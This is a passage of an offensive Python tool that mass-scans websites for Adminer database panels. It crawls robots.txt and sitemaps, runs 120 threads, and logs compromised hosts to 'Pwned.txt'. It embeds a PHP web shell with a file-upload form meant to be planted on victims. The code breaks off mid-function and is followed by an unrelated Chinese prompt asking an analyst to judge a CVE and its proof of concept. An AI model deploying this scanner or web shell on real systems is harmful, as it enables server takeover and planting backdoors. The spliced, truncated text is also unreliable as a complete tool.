time\nimport random\nimport string\nimport threading\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nfrom urllib.parse import urljoin, urlsplit\nimport requests\nimport urllib3\nfrom colorama import init, Fore, Back, Style\ninit(autoreset=True)\nurllib3.disable_warnings()\ndef show_banner():\n    os.system(\"cls\" if os.name == \"nt\" else \"clear\")\n    print(f\"\"\"\n╻ ╻┏━┓┏━┓╻ ╻\n┗┳┛┃ ┃┣┳┛┃ ┃ {Fore.YELLOW}Author:{Style.RESET_ALL} Yoru (يورو) [{Fore.GREEN}t.me/ChiefYoru{Style.RESET_ALL}]\n ╹ ┗━┛╹┗╸┗━┛\n  --| Telegram: ({Fore.GREEN}t.me/ChiefYoru_PoCs{Style.RESET_ALL}) |--\\n\"\"\")\nTIMEOUT = 15\nTHREADS = 120\nOUTPUT_FILE = \"Pwned.txt\"\nMARKER = '<a href=\"https://t.me/ChiefYoru\">Yoru'\nSHELL_CODE = '''<?php echo '<a href=\"https://t.me/ChiefYoru\">Yoru (يورو) </a><pre>'.php_uname().\"\\n\".'<br/><form method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"__\"><input name=\"_\" type=\"submit\" value=\"Upload\"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>'''\n_lock = threading.Lock()\n_hits = 0\n_fails = 0\n_timeouts = 0\n_done = 0\n_total = 0\nADMINER_PATHS = [\n    \"adminer.php\",\n    \"adminer/adminer.php\",\n    \"db/adminer.php\",\n    \"sql/adminer.php\",\n    \"adminer.php5\",\n    \"adminer-5.php\",\n    \"adminer/index.php\",\n    \"tools/adminer.php\",\n]\nADMINER_PATTERN = re.compile(r\"adminer|/db|db\\.php|sql|mysql|database\", re.I)\nFUZZ_DIRS = [\"\", \"adminer/\", \"db/\", \"sql/\", \"admin/\"]\nFUZZ_NAMES = [\"adminer.php\", \"db.php\", \"database.php\", \"mysql.php\", \"sql.php\", \"adminer/index.php\"]\nFUZZ_VERSIONS = [\"4.7.1\", \"4.8.0\", \"4.8.1\", \"5.0.0\", \"5.1.0\", \"5.2.0\", \"5.3.0\", \"5.4.0\", \"5.4.1\", \"5.4.2\"]\nCRAWL_SEEDS = [\"\", \"index.php\", \"admin/\", \"db/\", \"sql/\", \"login.php\"]\nVERSION_RE = re.compile(r\"class=['\\\"]version['\\\"][^>]*>\\s*([0-9]+(?:\\.[0-9]+)+)\", re.I)\nLOGIN_FORM_RE = re.compile(r'name=[\"\\']auth\\[driver\\][\"\\']', re.I)\nSTATIC_SUFFIXES = (\".css\", \".js\", \".png\", \".jpg\", \".jpeg\", \".gif\", \".svg\", \".ico\", \".woff\", \".woff2\", \".map\", \".webp\")\ndef looks_like_adminer(html: str) -> bool:\n    return bool(LOGIN_FORM_RE.search(html))\ndef discover_adminer_all(session, base_url):\n    seen = set()\n    hits = []\n    def probe(url):\n        if url in seen:\n            return\n        seen.add(url)\n        try:\n            r = session.get(url, timeout=8)\n            if r.status_code == 200 and looks_like_adminer(r.text):\n                hits.append(r.url)\n        except:\n            pass\n    root = urlsplit(base_url)\n    site_root = f\"{root.scheme}://{root.netloc}/\"\n    base_dir = base_url if base_url.endswith(\"/\") else base_url.rsplit(\"/\", 1)[0] + \"/\"\n    for p in ADMINER_PATHS:\n        probe(urljoin(base_dir, p))\n        probe(urljoin(site_root, p))\n    try:\n        r = session.get(urljoin(site_root, \"robots.txt\"), timeout=8)\n        for line in r.text.splitlines():\n            m = re.match(r\"^\\s*(?:Disallow|Allow)\\s*:\\s*(\\S+)\", line, re.I)\n            if m and ADMINER_PATTERN.search(m.group(1)):\n                path = m.group(1)\n                probe(urljoin(site_root, path))\n                if path.endswith(\"/\"):\n                    probe(urljoin(site_root, path + \"adminer.php\"))\n    except:\n        pass\n    sitemaps = [\"sitemap.xml\", \"sitemap_index.xml\", \"wp-sitemap.xml\"]\n    for sm in sitemaps:\n        try:\n            r = session.get(urljoin(site_root, sm), timeout=8)\n            if \"<loc>\" in r.text:\n                for loc in re.findall(r\"<loc>\\s*(.*?)\\s*</loc>\", r.text):\n                    if ADMINER_PATTERN.search(loc):\n                        probe(loc)\n        except:\n \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提